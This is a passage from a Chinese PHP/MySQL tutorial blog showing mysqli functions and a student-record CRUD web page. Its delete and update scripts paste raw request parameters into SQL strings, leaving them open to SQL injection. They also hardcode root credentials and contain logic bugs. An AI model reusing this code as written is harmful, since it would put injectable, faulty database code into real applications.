constant">INTO</span> <span class="token function">websites</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> url<span class="token punctuation">,</span> alexa<span class="token punctuation">,</span> country<span class="token punctuation">)</span><span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token string">'百度'</span><span class="token punctuation">,</span>'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com/','4','CN')");</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysqli-fetch-assoc"><a href="#mysqli-fetch-assoc" class="headerlink" title="mysqli_fetch_assoc()"></a>mysqli_fetch_assoc()</h3><p>它的作用是从结果集中取得一行作为关联数组，格式：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// 假定数据库用户名：root，密码：123456，数据库：RUNOOB </span><span class="token variable">$con</span><span class="token operator">=</span><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">,</span><span class="token string">"RUNOOB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"连接 MySQL 失败: "</span> <span class="token punctuation">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT name,url FROM websites ORDER BY alexa"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 关联数组</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%s (%s)\n"</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 释放结果集</span><span class="token function">mysqli_free_result</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网页实现增删改查"><a href="#网页实现增删改查" class="headerlink" title="网页实现增删改查"></a>网页实现增删改查</h3><p>首先要知道增删改查的命令：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 增加</span><span class="token keyword">insert</span> <span class="token keyword">into</span> student<span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>classID<span class="token punctuation">)</span> <span class="token keyword">value</span><span class="token punctuation">(</span><span class="token string">'$name'</span><span class="token punctuation">,</span>$age<span class="token punctuation">,</span>$county<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 删除</span><span class="token keyword">delete</span> <span class="token keyword">from</span> student <span class="token keyword">where</span> id<span class="token operator">=</span>$id<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 修改</span><span class="token keyword">update</span> student <span class="token keyword">set</span> name<span class="token operator">=</span>$name<span class="token punctuation">,</span>age<span class="token operator">=</span>$age<span class="token punctuation">,</span>classID<span class="token operator">=</span>$county <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 查找</span><span class="token keyword">select</span> student<span class="token punctuation">.</span>id<span class="token punctuation">,</span>student<span class="token punctuation">.</span>name<span class="token punctuation">,</span>student<span class="token punctuation">.</span>age<span class="token punctuation">,</span>class<span class="token punctuation">.</span>clasName <span class="token keyword">from</span> student <span class="token keyword">left</span> <span class="token keyword">join</span> class <span class="token keyword">on</span> student<span class="token punctuation">.</span>classID<span class="token operator">=</span>class<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="实现查找"><a href="#实现查找" class="headerlink" title="实现查找"></a>实现查找</h5><p>我把这个查找的页面当作index页面：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>数据库增删改查<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token punctuation">.</span>wrapper <span class="token punctuation">{</span>width<span class="token punctuation">:</span> 1000px<span class="token punctuation">;</span>margin<span class="token punctuation">:</span> 20px auto<span class="token punctuation">;</span><span class="token punctuation">}</span>    h2 <span class="token punctuation">{</span>text<span class="token operator">-</span>align<span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">.</span>add <span class="token punctuation">{</span>margin<span class="token operator">-</span>bottom<span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">.</span>add a <span class="token punctuation">{</span>text<span class="token operator">-</span>decoration<span class="token punctuation">:</span> none<span class="token punctuation">;</span>color<span class="token punctuation">:</span> <span class="token shell-comment comment">#fff;background-color: green;padding: 6px;border-radius: 5px;}</span>    td <span class="token punctuation">{</span>text<span class="token operator">-</span>align<span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wrapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>数据库增删改查<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>增加数据<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>960<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>序号<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>姓名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>年龄<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>国家<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>操作<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$link</span> <span class="token operator">=</span> @<span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"数据库连接失败！&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 查询操作</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select student.id,student.name,student.age,class.clasName from student left join class on student.classID=class.id"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 接收返回的数组</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 把返回的关联数组循环赋给row，并取出到表格中</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$row['id']}&lt;/td>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$row['name']}&lt;/td>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$row['age']}&lt;/td>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$row['clasName']}&lt;/td>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--这里添加修改与删除的操作，删除操作在当前页面完成，修改操作跳转到edt.php--></span></span>            <span class="token markup">&lt;a href='javascript:del({$row['id']})'></span>删除<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>/www.f.com/testSQL/edt.html<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>修改<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">/></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--这里进行一个删除的确认操作，确认后把id传到location里以进行跳转--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token keyword">function</span> <span class="token function">del</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"确定删除这条新闻吗？"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"del.php?id="</span><span class="token operator">+</span>id<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111000704420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="实现删除"><a href="#实现删除" class="headerlink" title="实现删除"></a>实现删除</h5><p>接上面的弹窗，当用户确认后，跳转到del.php页面执行操作：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token shell-comment comment"># 连接数据库</span>    <span class="token variable">$link</span> <span class="token operator">=</span> @<span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 接收参数</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"delete from student where id=$id"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 接收执行SQL语句后的返回值</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断操作是否执行成功</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'数据删除成功！'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='index.php'>返回&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'数据删除失败！'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='index.php'>返回&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点击删除：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111100073172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>确认后：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111000755413.png#pic_center" alt="在这里插入图片描述"></p><h5 id="实现修改"><a href="#实现修改" class="headerlink" title="实现修改"></a>实现修改</h5><p>在index.php的操作栏中，有一个修改选项，点击后会跳转到edt.html页面：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>数据修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>数据修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>edt.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    姓名: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    年龄:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    国家:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>county<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>注：1蜀国 2吴国 3魏国<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111000555913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>提交后跳转到edt.php页面执行SQL语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">// 接收数据</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$county</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'county'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//连接数据库</span>    <span class="token variable">$link</span> <span class="token operator">=</span> @<span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 修改数据</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update student set name='$name',age=$age,classID=$county where id=$id"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">==</span><span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'数据修改成功！'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='index.php'>返回&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'数据修改失败！'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='index.php'>返回&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们修改一下甘宁，改成曹操：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111001837351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>填写数据：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 